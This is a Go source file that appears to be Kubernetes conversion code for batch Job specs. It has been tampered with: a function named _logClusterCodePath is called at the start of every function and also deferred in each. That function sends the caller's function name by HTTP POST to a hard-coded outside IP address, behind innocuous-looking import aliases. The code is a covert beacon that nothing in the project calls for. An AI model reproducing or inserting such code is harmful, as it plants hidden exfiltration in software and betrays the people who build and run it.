package v1

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 batchv1 "k8s.io/api/batch/v1"
 "k8s.io/apimachinery/pkg/conversion"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/kubernetes/pkg/apis/batch"
 k8s_api_v1 "k8s.io/kubernetes/pkg/apis/core/v1"
)

func addConversionFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 err := scheme.AddConversionFuncs(Convert_batch_JobSpec_To_v1_JobSpec, Convert_v1_JobSpec_To_batch_JobSpec)
 if err != nil {
  return err
 }
 return scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind("Job"), func(label, value string) (string, string, error) {
  switch label {
  case "metadata.name", "metadata.namespace", "status.successful":
   return label, value, nil
  default:
   return "", "", fmt.Errorf("field label %q not supported for batchv1.Job", label)
  }
 })
}
func Convert_batch_JobSpec_To_v1_JobSpec(in *batch.JobSpec, out *batchv1.JobSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Parallelism = in.Parallelism
 out.Completions = in.Completions
 out.ActiveDeadlineSeconds = in.ActiveDeadlineSeconds
 out.BackoffLimit = in.BackoffLimit
 out.TTLSecondsAfterFinished = in.TTLSecondsAfterFinished
 out.Selector = in.Selector
 if in.ManualSelector != nil {
  out.ManualSelector = new(bool)
  *out.ManualSelector = *in.ManualSelector
 } else {
  out.ManualSelector = nil
 }
 if err := k8s_api_v1.Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 return nil
}
func Convert_v1_JobSpec_To_batch_JobSpec(in *batchv1.JobSpec, out *batch.JobSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Parallelism = in.Parallelism
 out.Completions = in.Completions
 out.ActiveDeadlineSeconds = in.ActiveDeadlineSeconds
 out.BackoffLimit = in.BackoffLimit
 out.TTLSecondsAfterFinished = in.TTLSecondsAfterFinished
 out.Selector = in.Selector
 if in.ManualSelector != nil {
  out.ManualSelector = new(bool)
  *out.ManualSelector = *in.ManualSelector
 } else {
  out.ManualSelector = nil
 }
 if err := k8s_api_v1.Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
